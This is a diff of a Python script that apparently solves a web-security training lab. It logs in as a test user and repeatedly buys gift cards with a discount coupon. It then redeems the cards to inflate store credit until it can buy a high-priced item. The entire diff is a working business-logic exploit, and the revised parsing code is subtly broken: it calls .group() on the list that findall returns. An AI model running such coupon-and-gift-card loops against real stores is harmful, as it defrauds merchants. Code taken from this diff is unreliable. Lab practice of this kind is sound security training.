@@ -23,46 +23,58 @@ def get_csrf_token(session, url, default="/cart/order-confirmation?order-confirm
 
 
 def business_logic_exploit(session, url) :
+    
+    # Get the CSRF token from login
     login_url = url + '/login'
     csrf_token = get_csrf_token(session, login_url)
+    
+    # Login as the wiener user
     data = {'csrf':csrf_token,'username':'wiener','password':'peter'}
     res = session.post(login_url, data=data, verify=False, proxies=proxies)
     
     if "Log out" in res.text :
+        
         print("The wiener user log in successfully!")
-        price = 100
-        cart_url = "url_here"
-        headers = {"headers":"https://0aff004e04792f7a807ddf15004400d5.web-security-academy.net"}
-        while price < 1337.0 :
-            cart_url = url + '/cart'
-            data = {'productId':'2','redir':'PRODUCT','quantity':'1'}
-            session.post(cart_url, data=data, headers=headers, verify=False, proxies=proxies)
+        
+        price = 0
+        cart_url = url + '/cart'
+        coupon_url = url + '/cart/coupon'
+        checkout_url = url + '/cart/checkout'
+        
+        # headers = {"Referer":url}
+        
+        while price < 935.9 :
             
-            coupon_url = url + '/cart/coupon'
+            # Adding the gift item 
+            data = {'productId':'2','redir':'PRODUCT','quantity':'1'}
+            r = session.post(cart_url, data=data, verify=False, proxies=proxies)
+            
             csrf_token = get_csrf_token(session, cart_url)
             data = {'csrf':csrf_token,'coupon':'SIGNUP30'}
-            session.post(coupon_url, data=data, headers=headers, verify=False, proxies=proxies)
+            r = session.post(coupon_url, data=data, verify=False, proxies=proxies)
             
-            checkout_url = url + '/cart/checkout'
             data = {'csrf':csrf_token}
-            res = session.post(checkout_url, data=data, headers=headers, verify=False, proxies=proxies)
-            # session.post(checkout_url, allow_redirects=False, data=data, verify=False, proxies=proxies)
+            res = session.post(checkout_url, data=data, verify=False, proxies=proxies)
             
             if "is-table-numbers" in res.text :
                 # Use regex to find the content of the top <td> element in the specific table
                 pattern = r'<table\s+class="is-table-numbers">.*?<td>(.*?)<\/td>'
 
-                matches = re.search(pattern, res.text, re.DOTALL)
+                matches = re.findall(pattern, res.text)
                 
                 if matches:
                     top_td_content = matches.group(1)
-                    gift_url = url + '/gift-card'
+                    my_account_url = url + "/my-account?id=wiener"
+                    csrf_token = get_csrf_token(session, my_account_url)
+                    
+                    gift_url = url + "/gift-card"
                     data = {'csrf':csrf_token,'gift-card':top_td_content}
                     
-                    res = session.post(gift_url, data=data, headers=headers, verify=False, proxies=proxies)
+                    res = session.post(gift_url, data=data, verify=False, proxies=proxies)
                     # Use regex to find the total store credit value
-                    pattern = r'Store credit:\s*\$([\d,.]+)'
+                    pattern = r'Store credit: \$(.*) '
                     matches = re.search(pattern, res.text)
+                    print(matches)
                     if matches:
                         price = float(matches.group(1))
                         print("Store Credit Value:", price)
@@ -70,18 +82,27 @@ def business_logic_exploit(session, url) :
                         print("Store credit value not found.")
                 else:
                     print("Top TD content not found.")
-                
+         
+        # Adding the ligth jacket       
         data = {'productId':'1','redir':'PRODUCT','quantity':'1'}
-        r = session.post(cart_url, data=data, headers=headers, verify=False, proxies=proxies)
+        r = session.post(cart_url, data=data, verify=False, proxies=proxies)
+         
+        # Applying the gift cart                
+        csrf_token = get_csrf_token(session, cart_url)
+        data = {'csrf':csrf_token,'coupon':'SIGNUP30'}
+        r = session.post(coupon_url, data=data, verify=False, proxies=proxies)
+        
+        # Buying the ligth jacket 
+        data = {'csrf':csrf_token}
+        res = session.post(checkout_url, data=data, verify=False, proxies=proxies)
+        
+        if "Your order is on its way!" in res.text :
+            print("You have successfully buy the item!")
+        else :
+            print("Failed to buy the item!")
     else :
         print("You failed to solve the lab!")
     
-
-    
-    checkout_url = url + '/cart/checkout'
-    data = {'csrf':csrf_token}
-    res = session.post(checkout_url, data=data, verify=False, proxies=proxies) 
-
 if __name__ == "__main__" :
     try :
         url = sys.argv[1]
